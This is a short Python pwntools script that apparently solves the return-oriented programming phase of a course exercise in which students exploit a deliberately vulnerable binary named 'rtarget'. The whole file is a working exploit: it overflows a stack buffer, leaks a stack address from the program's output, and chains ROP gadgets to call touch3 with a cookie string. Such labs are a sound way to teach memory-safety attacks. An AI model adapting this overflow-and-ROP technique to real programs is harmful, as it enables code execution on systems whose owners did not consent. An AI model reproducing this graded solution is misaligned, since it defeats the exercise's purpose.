#!/usr/bin/env python3

from pwn import *

context.binary = "rtarget"
context.terminal = ["zellij", "run", "--"]

proc = process(["rtarget", "-q"])
elf = ELF("rtarget")
rop = ROP("rtarget")
cookie = int(open("cookie.txt").read(), 16)
buffer_size = 0x18

exploit = b"\x90" * buffer_size \
    + p64(0x4018c4) \
    + p64(elf.symbols["test"] + 14) \
    + p64(9) \
    + p64(elf.symbols["getbuf"])

proc.sendline(exploit)
proc.recvuntil("No exploit.  Getbuf returned ")
rsp = int(proc.recvline(), 16) - 0x8 * 2 | 0x7fff00000000

sval = hex(cookie)[2:].encode("utf-8") + b"\0"
exploit = b"\x90" * buffer_size \
    + p64(rop.ret.address) \
    + p64(rop.rdi.address) \
    + p64(rsp + 0x48) \
    + p64(elf.symbols["touch3"]) \
    + sval

proc.sendline(exploit)
proc.interactive()
